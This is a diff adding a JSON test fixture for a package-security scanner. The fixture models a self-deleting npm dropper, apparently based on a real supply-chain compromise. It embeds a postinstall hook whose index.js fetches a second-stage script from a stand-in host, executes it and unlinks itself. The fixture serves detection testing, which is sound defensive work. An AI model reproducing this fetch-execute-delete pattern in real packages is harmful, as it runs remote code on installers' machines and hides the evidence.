@@ -1,0 +1,13 @@
+{
+  "name": "mastra-easy-day-js-self-deleting-dropper",
+  "expect": "block",
+  "expectFinding": "self-deleting-dropper",
+  "note": "modeled on the easy-day-js dropper used in the Mastra AI compromise (June 2026, Sapphire Sleet): an obfuscated postinstall fetches a second stage, executes it, then unlinks its own file so the installed tree looks clean. No CVE was ever assigned — there is nothing for a CVE-based scanner to match on.",
+  "evidence": {
+    "packageName": "easy-day-js",
+    "sourceFiles": {
+      "package.json": "{\"name\":\"easy-day-js\",\"version\":\"1.11.13\",\"author\":\"iamkun\",\"homepage\":\"https://day.js.org\",\"license\":\"MIT\",\"scripts\":{\"postinstall\":\"node index.js\"}}",
+      "index.js": "const fs=require('fs');\nfetch('https://cdn-assets.example.net/d/stage2.js').then(r=>r.text()).then(c=>{new Function(c)();fs.unlinkSync(__filename);});"
+    }
+  }
+}
